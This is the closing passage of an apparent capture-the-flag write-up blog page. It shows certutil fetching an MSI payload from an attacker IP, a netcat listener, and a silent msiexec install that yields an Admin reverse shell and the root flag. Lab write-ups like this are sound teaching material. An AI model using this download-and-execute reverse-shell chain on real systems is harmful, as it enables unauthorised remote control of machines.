<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>certutil.exe -urlcache -f http://10.10.14.12:4000/shell.msi shell.msi
</span></span></code></pre></div><p>Running netcat listener on attacker machine.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>nc -lnvp <span style="color:#ae81ff">5555</span>
</span></span></code></pre></div><p>Now its time to execute the msi payload.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>msiexec /quiet /qn /i shell.msi
</span></span></code></pre></div><p>We got the reverse shell as Admin.</p>
<p><img src="/assets/Pasted%20image%2020220417054225.png" alt="assets/Pasted image 20220417054225.png"></p>
<p>Let&rsquo;s get the Root Flag as well.</p>
<p><img src="/assets/Pasted%20image%2020220417054415.png" alt="assets/Pasted image 20220417054415.png"></p>
<h6 id="thank-you-for-reading">Thank You For Reading</h6>
<hr>

            </div>
        </article>

        <hr />

        <div class="post-info">
            
            
  		</div>
    </main>

            </div>

            
                <footer class="footer">
    <div class="footer__inner">

    </div>
    <div class="footer__inner">
        <div class="footer__content">
            <span></span>
            <span>Made with 💛 by <a href="/">An0nud4y</a></span>
          </div>
    </div>
</footer>

            
        </div>

        




<script type="text/javascript" src="/bundle.min.87b3f38a3db2ce75b475923acfbff5600a03aacd3156e48741ecf79702087c8447b1c14b2d42ac3d33ce3f45bb346feeee85c8751f1510cf5cf92a8a5a36801c.js" integrity="sha512-h7Pzij2yznW0dZI6z7/1YAoDqs0xVuSHQez3lwIIfIRHscFLLUKsPTPOP0W7NG/u7oXIdR8VEM9c&#43;SqKWjaAHA=="></script>



    </body>
</html>
